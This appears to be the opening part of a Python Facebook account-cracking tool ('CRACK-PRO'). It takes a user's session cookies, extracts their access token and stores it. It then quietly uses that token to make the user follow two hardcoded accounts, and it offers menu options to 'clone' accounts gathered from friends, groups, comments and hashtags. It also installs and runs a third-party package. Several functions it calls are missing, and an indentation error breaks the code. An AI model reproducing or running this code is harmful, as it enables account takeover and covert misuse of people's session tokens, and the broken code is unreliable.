#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote


### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_cici_azimvau_    = input
_azimvau_dapunta_ = open
_cici_cici_       = exit

### Warna
Z = "\033[1;30m" # Hitam
P = "\033[1;37m" # Putih
M = "\033[1;31m" # Merah
H = "\033[1;32m" # Hijau
K = "\033[1;33m" # Kuning
B = "\033[1;34m" # Biru
U = "\033[1;35m" # Ungu
O = "\033[1;36m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_1 = {}
data_2 = {}
data_change_1 = {}
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

r = str(random.randint(1,9999))
rx = r.replace("1","A").replace("2","C").replace("3","B").replace("4","E").replace("5","H").replace("6","I").replace("7","Y")
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")

try:
    rq = requests.get('https://github.com/Shuvo-BBHH/premiouM/blob/main/irements.txt').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()

### Waktu & Tanggal
__sekarang__ = datetime.now()
__tahun__ = __sekarang__.year
__bulan__ = __sekarang__.month
__hari__  = __sekarang__.day

bulan_ttl = {"01": "JAN", "02": "FEB", "03": "MAR", "04": "APR", "05": "MAY", "06": "JUN", "07": "JUL", "08": "AUG", "09": "SEP", "10": "OCT", "11": "NOV", "12": "DEC"}
_list_bulan_ = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]

try:
    if __bulan__ < 0 or __bulan__ > 12:
        _cici_cici_()
    _bulan_sekarang_ = __bulan__ - 1
except ValueError:
    _cici_cici_()
_bulan_ = _list_bulan_[_bulan_sekarang_]
tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

_my_account_ = [
    '100045203855294','100014839270205']

### User Agent
ua_intelmac = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]'
ua_nokia   = 'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'
ua_asus    = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]' #DONE
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 4.1.1; X909 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]'
ua_windows = 'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
### Clear Login Session
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Logo
def banner():
        os.system("clear")
        os.system('echo "\n\33[93m███╗   ███╗ █████╗ ██╗  ██╗██████╗ ██╗    \n\033[91m████╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m      \n         ╔═════════════════════════════╗\n         ║ TOOL NAME: { CRACK-PRO }    ║\n         ║ AUTHOR   : MAHDI       ║\n         ║ GITHUB   : Shuvo-BBHH       ║\n         ║ Bikash/cont;01887408882     ║\n         ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')
        print("")
        
def cek_dev():
    _isi_dev_ = _azimvau_dapunta_('cookies.txt','r').read()
    if 'null' in _isi_dev_:jalan('%s [%s!%s] %INVALID COOKIES, RE-LOGIN WITH COOKIES'%(M,P,M,P));bersih();_cici_cici_()
    else:pass


def bot_follow(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
            except:pass
        print('%s '%(O));jalan('%s [%s!%s] %sLOGIN SUCCESSFUL %s^_^'%(H,P,H,H,P));time.sleep(2)
    except:pass
    

def menu_log():
    bersih();clear()
    banner()
    var_menu()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
         os.system('pkg install python2 -y')
        os.system('pip2 install NHClone')
        os.system('NH-Clone')
        main()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = _cici_azimvau_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
        try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
        except (KeyError,IOError,AttributeError):print('%s '%(O));jalan('%s [%s!%s] %sCOOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    elif pmu in ['0','00','000','z']:exit()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()


def menu():
    clear()
    banner()
    jid = ''
    try:
        _azimvau_ = _azimvau_dapunta_("token.txt","r").read();_cici_ = _azimvau_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
        if 'null' in _cici_:status_cookies = ('%sNO'%(M));W = Z;Y = P; B1 = Z; O1 = Z; K1 = Z; H1 = Z; M1 = Z; P1 = Z
        else:status_cookies = ('%sYES'%(H));W = H; Y = K; B1 = B; O1 = O; K1 = K; H1 = H; M1 = M; P1 = P
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    
    try:token = _azimvau_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,M));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36;]"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    psb('         %s》%s》%s》%sEVERY HUSTLER GET PAYDAY%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    print('%s [%s•%s] %sNAME   %s: %s%s'%(H,P,H,B,K,H,n))
    print('%s [%s•%s] %sID     %s: %s%s'%(H,P,H,B,K,H,i))
    print('%s [%s•%s] %sIP     %s: %s%s'%(H,P,H,B,K,H,ip))
    print('%s [%s•%s] %sFROM   %s: %s%s'%(H,P,H,B,K,H,loc))
    print('%s [%s•%s] %sSTATUS %s: %sPREMIUM :)'%(H,P,H,B,K,H))
    print('')
    print('%s [%s>_%s] %sTOKEN%s/%sCOOKIES %s: %sYES%s/%s'%(H,P,H,B,Z,B,K,H,P,status_cookies))
    print('%s '%(O))
    psb('%s [%s01%s] %sCLONE FROM FRIEND/PUBLIC ID '%(H,P,H,H))
    psb('%s [%s02%s] %sCLONE FROM FOLLOWER ID V1'%(H,P,H,B1))
    psb('%s [%s03%s] %sCLONE FROM FOLLOWER ID V2'%(H,P,H,M1))
    psb('%s [%s04%s] %sCLONE FROM SEARCH NAME ID '%(H,P,H,O1))
    psb('%s [%s05%s] %sCLONE FROM MESSAGE LIST ID '%(H,P,H,K1))
    psb('%s [%s06%s] %sCLONE FROM POST REACTS '%(H,P,H,H1))
    psb('%s [%s07%s] %sCLONE FROM POST COMMENTS '%(H,P,H,B1))
    psb('%s [%s08%s] %sCLONE FROM GROUP MEMBERS '%(H,P,H,M1))
    psb('%s [%s09%s] %sCLONE ID FROM EMAIL'%(H,P,H,O))
    psb('%s [%s10%s] %sCLONE USERNAME'%(H,P,H,K))
    psb('%s [%s11%s] %sCLONE FROM HASHTAG'%(H,P,H,B1))
    psb('%s [%s12%s] %sCLONE ID FROM HOME PAGE'%(H,P,H,P1))
    psb('%s [%s13%s] %sCLONE ID FROM FRIEND REQUESTS '%(H,P,H,K1))
    psb('%s [%s14%s] %sCLONE FROM SENT REQUESTS '%(H,P,H,H1))
    psb('%s [%s15%s] %sCOLLECT UID FROM PUBLIC ID'%(H,P,H,O))
    psb('%s [%s16%s] %sAUTO CLONE CRACKED IDS'%(H,P,H,K))
    psb('%s [%s17%s] %sVIEW CLONE RESULTS '%(H,P,H,P))
    psb('%s [%s18%s] %sUSER AGENT SETTINGS '%(H,P,H,M))
    psb('%s [%s19%s] %s FILE'%(H,P,H,H))
    psb('%s [%s00%s] %sLOG OUT'%(H,M,H,M))
    print('')
    pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
    elif pm in ['1','01','001','a']:publik(token)
    elif pm in ['2','02','002','b']:pengikut(token)
    elif pm in ['3','03','003','c']:cek_dev();followers(_salsabila_)
    elif pm in ['4','04','004','d']:cek_dev();dump_name(_salsabila_)
    elif pm in ['5','05','005','e']:cek_dev();dump_pesan(_salsabila_,n,i)
    elif pm in ['6','06','006','f']:cek_dev();main_likers(_salsabila_)
    elif pm in ['7','07','007','g']:cek_dev();main_komen(_salsabila_)
    elif pm in ['8','08','008','h']:cek_dev();dump_grup(_salsabila_,_azimvau_)
    elif pm in ['9','09','009','i']:dump_email()
    elif pm in ['10','010','0010','j']:dump_username()
    elif pm in ['11','011','0011','k']:cek_dev();hashtag(_salsabila_)
    elif pm in ['12','012','0012','l']:cek_dev();beranda(_salsabila_)
    elif pm in ['13','013','0013','m']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)
    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)
    elif pm in ['15','015','0015','o']:teman_target()
    elif pm in ['16','016','0016','p']:cek_result()
    elif pm in ['17','017','0017','q']:result()
    elif pm in ['18','018','0018','r']:ugen()
    elif pm in ['19','019','0019','s']:file()
    elif pm in ['0','00','000','z']:jalan('%s [%s!%s] %sSEE YOU %s%s%s'%(H,P,H,K,O,n,P));bersih();menu_log()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()


def defaultua():
    ua = ua_xiaomi
    try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()


def ugen():
    var_ugen()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_azimvau_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
        try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _azimvau_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'NOT FOUND'
        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['0','00','000','f']:menu()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s [%s1%s] %INTELMAC'%(H,P,H,K))
    print('%s [%s2%s] %sNOKIA'%(H,P,H,H))
    print('%s [%s3%s] %sASUS'%(H,P,H,M))
    print('%s [%s4%s] %sHUAWEI'%(H,P,H,B))
    print('%s [%s5%s] %sVIVO'%(H,P,H,O))
    print('%s [%s6%s] %sOPPO'%(H,P,H,K))
    print('%s [%s7%s] %sSAMSUNG'%(H,P,H,B))
    print('%s [%s8%s] %sWINDOWS'%(H,P,H,M))
    print('%s [%s9%s] %sXIAOMI'%(H,P,H,M))
    print('')
    pc = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    elif pc in ['1','01']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    elif pc in ['9','09']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
